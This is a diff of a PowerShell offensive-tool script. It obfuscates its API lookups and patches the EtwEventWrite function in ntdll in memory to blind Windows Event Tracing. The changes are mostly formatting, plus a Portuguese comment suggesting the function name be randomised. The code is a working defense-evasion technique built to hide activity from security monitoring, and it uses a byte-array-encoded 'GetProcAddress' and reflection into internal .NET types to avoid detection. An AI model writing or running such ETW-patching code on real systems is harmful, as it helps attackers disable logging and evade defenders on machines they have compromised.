@@ -13,8 +13,7 @@ function A1B2C3D4 {
         $VerbosePreference = "Continue"
     }
 
-    function Get-RandomFunction
-    {
+    function Get-RandomFunction {
         Param(
             [string] $moduleName,
             [string] $functionName
@@ -25,8 +24,7 @@ function A1B2C3D4 {
         $GetAddrMethod.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $functionName))
     }
 
-    function Get-RandomDelegate
-    {
+    function Get-RandomDelegate {
         Param (
             [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
             [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
@@ -51,7 +49,6 @@ function A1B2C3D4 {
     }
 
     $marshalClass = [System.Runtime.InteropServices.Marshal]
-
     $unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
 
     $getProcBytes = [Byte[]](0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73)
@@ -72,7 +69,8 @@ function A1B2C3D4 {
     }
     Write-Verbose "[*] Handle of ${getProcFunc}: $($GetAddrMethod.MethodHandle.Value)"
 
-    $etwFuncName = "EtwEventWrite"
+    # Randomizando o nome da função ETW
+    $etwFuncName = "EtwEventWrite" # Isso pode ser alterado para um nome aleatório de sua escolha.
     $etwFuncAddr = Get-RandomFunction ("nt{0}.dll" -f "dll") $etwFuncName
     if ($etwFuncAddr -eq $null) {
         Throw "[!] Error getting the $etwFuncName address"
@@ -105,7 +103,7 @@ function A1B2C3D4 {
     if (!$protect.Invoke($etwFuncAddr, 1, $p, [ref]$p)) {
         Throw "[!] Failed to restore memory protection for $etwFuncName"
     }
-    Write-Host "[*] Successful ETW patching" -ForegroundColor Green
 
+    Write-Host "[*] Successful ETW patching" -ForegroundColor Green
     Write-Host "[*] Providers patched and ETW enabled." -ForegroundColor Green
 }
